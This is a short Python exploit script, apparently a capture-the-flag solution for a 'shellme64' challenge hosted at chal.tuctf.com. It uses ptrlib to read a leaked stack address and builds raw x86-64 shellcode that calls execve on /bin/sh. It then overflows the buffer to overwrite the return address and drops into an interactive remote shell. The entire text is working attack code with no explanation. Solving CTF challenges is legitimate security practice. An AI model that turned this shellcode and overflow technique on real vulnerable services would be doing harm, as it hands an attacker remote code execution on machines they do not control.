from ptrlib import *

#sock = Process("./shellme64")
sock = Socket("chal.tuctf.com", 30507)

sock.recvline()
addr_stack = int(sock.recvline(), 16)
logger.info("stack = " + hex(addr_stack))
shellcode = b"/bin/sh\x00"
shellcode += b"\x48\x31\xD2\x48\x31\xF6\x48\xBF" + p64(addr_stack) + b"\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
shellcode += b'\xcc' * (0x28 - len(shellcode))
shellcode += p64(addr_stack + 8)
sock.sendlineafter("> ", shellcode)

sock.interactive()
